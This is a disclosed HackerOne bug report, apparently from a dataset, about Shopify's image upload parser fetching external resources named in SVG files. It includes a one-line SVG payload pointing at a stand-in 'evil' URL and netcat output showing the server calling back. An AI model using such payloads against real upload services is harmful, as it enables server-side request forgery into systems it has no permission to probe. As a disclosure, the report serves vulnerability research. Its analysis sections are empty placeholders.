---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '97501'
original_report_id: '97501'
title: SVG parser loads external resources on image upload
weakness: Cross-Site Request Forgery (CSRF)
team_handle: shopify
created_at: '2015-11-03T20:09:47.070Z'
disclosed_at: '2016-06-02T12:57:44.031Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# SVG parser loads external resources on image upload

## Metadata

- HackerOne Report ID: 97501
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: shopify
- Disclosed At: 2016-06-02T12:57:44.031Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Uploading SVG that include

```
 <image xlink:href="http://example.com/?evil=var" />
```

will cause the server side parser to try to fetch external resources.

I've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. 

Also tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. 

```
Listening on [0.0.0.0] (family 0, port 3001)
Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
GET /?evil=var HTTP/1.0
Host: 37.139.18.151:3001
Accept-Encoding: gzip
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
